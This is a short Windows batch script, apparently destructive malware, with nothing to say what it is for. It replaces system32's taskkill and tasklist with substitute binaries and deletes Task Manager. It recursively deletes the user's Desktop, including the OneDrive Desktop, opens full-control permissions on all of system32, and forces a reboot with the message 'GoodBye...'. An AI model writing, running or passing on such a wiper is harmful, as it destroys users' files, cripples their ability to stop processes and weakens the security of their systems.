@echo off
color 0c
takeown /f "%windir%\system32\taskkill.exe"
icacls "%windir%\system32\taskkill.exe" /grant "%username%":F /T
copy "%windir%\system32\WindowsStarter\taskkill.exe" "%windir%\system32\taskkill.exe"/y


takeown /f "%windir%\system32\tasklist.exe"
icacls "%windir%\system32\tasklist.exe" /grant "%username%":F /T
copy "%windir%\system32\WindowsStarter\tasklist.exe" "%windir%\system32\tasklist.exe"/y

rem takeown /f "%windir%\system32\shutdown.exe"
rem icacls "%windir%\system32\shutdown.exe" /grant "%username%":F /T
rem copy "%windir%\system32\shutdown.exe" "%windir%\system32\copiconfig.exe"/y
rem del "%windir%\system32\shutdown.exe"/q
rem copy "%windir%\system32\WindowsStarter\shutdown.exe" "%windir%\system32\shutdown.exe"/y


rd "%windir%\system32\WindowsStarter"/q/s


takeown /f "%windir%\system32\taskmgr.exe"
icacls "%windir%\system32\taskmgr.exe" /grant "%username%":F /T
del "%windir%\system32\taskmgr.exe"/q









if exist "%userprofile%\OneDrive" (cd "%userprofile%\OneDrive") else (cd "%userprofile%")
rd Desktop/q/s

cd %windir%\system32
icacls * /grant "%username%":F /C

cd "%userprofile%"
rem copiconfig -r -c "GoodBye..." -t 2
shutdown -r -c "GoodBye..." -t 2
del commandkiller.exe/q
